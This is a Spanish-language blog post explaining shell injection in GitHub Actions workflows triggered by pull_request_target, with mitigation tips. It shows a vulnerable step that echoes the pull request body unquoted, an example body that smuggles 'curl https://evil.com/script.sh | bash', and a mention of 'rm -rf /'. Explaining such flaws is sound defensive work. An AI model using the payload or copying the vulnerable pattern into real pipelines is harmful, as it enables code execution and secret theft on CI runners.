---
title: Inyecci N De Shell En Ci Cd De Github Actions
published: true
date: 2023-07-04 03:28:33 UTC
tags: medium,blog,python
canonical_url: https://medium.com/p/83f03a7252ce
---

# Inyección de Shell en CI/CD de GitHub Actions

GitHub Actions ofrece un tipo de evento especial llamado pull_request_target que permite que los flujos de trabajo se ejecuten en… 

* * *

Inyección de Shell en CI/CD de GitHub Actions

![](https://cdn-images-1.medium.com/max/800/0*E2aHSaZhMSRw60Q3)Photo by [FLY:D](https://unsplash.com/es/@flyd2069?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)

[GitHub Actions](https://github.com/features/actions) ofrece un tipo de evento especial llamado `pull_request_target` que permite que los flujos de trabajo se ejecuten en solicitudes de extracción desde bifurcaciones con los mismos permisos que el repositorio base. Esto puede ser útil en algunos escenarios, como comentar en solicitudes de extracción o verificar dependencias privadas. Sin embargo, también conlleva riesgos significativos de seguridad y se debe utilizar con precaución.

Uno de los principales riesgos de usar `pull_request_target` es que expone secretos y variables de entorno a código no confiable de la solicitud de extracción. Esto significa que un atacante puede crear una solicitud de extracción maliciosa que roba o divulga esta información sensible, o las utiliza para realizar acciones no autorizadas en nombre del propietario del repositorio. Por ejemplo, un atacante podría acceder al token de GitHub y crear nuevos problemas, comentarios, versiones o incluso eliminar el repositorio.

Otro riesgo de usar `pull_request_target` es que ejecuta el archivo de flujo de trabajo desde la rama base, no desde la rama de la solicitud de extracción. Esto significa que un atacante puede modificar el archivo de flujo de trabajo en la solicitud de extracción e inyectar comandos o scripts arbitrarios que se ejecutarán en el flujo de trabajo de la rama base. Por ejemplo, un atacante podría agregar un paso que ejecuta `rm -rf /` en la máquina del ejecutor, o ejecutar un shell remoto.

Una de las formas en que un atacante puede inyectar comandos o scripts en el flujo de trabajo es utilizando una inyección de shell. La inyección de shell es una técnica que aprovecha una vulnerabilidad en un programa que ejecuta un comando en un shell sin escapar o validar correctamente la entrada. Por ejemplo, si el flujo de trabajo utiliza un paso como este:
    
    
    - name: Ejecutar comando  
      run: echo ${{ github.event.pull_request.body }}

Un atacante podría crear una solicitud de extracción con un cuerpo como este:
    
    
    Hola mundo; curl https://evil.com/script.sh | bash

Esto haría que el flujo de trabajo ejecute el comando `echo Hola mundo; curl https://evil.com/script.sh | bash`, que descargaría y ejecutaría un script malicioso desde una fuente externa.

Para prevenir ataques de inyección de shell, los usuarios de GitHub Actions deben seguir algunas mejores prácticas, como:

  * Escapar o citar la entrada de la solicitud de extracción antes de utilizarla en el flujo de trabajo.
  * Utilizar funciones o acciones integradas para manejar la entrada en lugar de ejecutar comandos en un shell.
  * Utilizar herramientas de análisis de código para detectar vulnerabilidades en el código o el flujo de trabajo.
  * Utilizar herramientas o servicios de terceros para ejecutar flujos de trabajo en entornos aislados.



* * *

Referencias:   
<https://securitylab.github.com/research/github-actions-preventing-pwn-requests/>  
<https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/>

By [Kfir Gisman](https://medium.com/@Kfir-G) on [July 4, 2023](https://medium.com/p/83f03a7252ce).

[Canonical link](https://medium.com/@Kfir-G/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce)

Exported from [Medium](https://medium.com) on December 20, 2025.
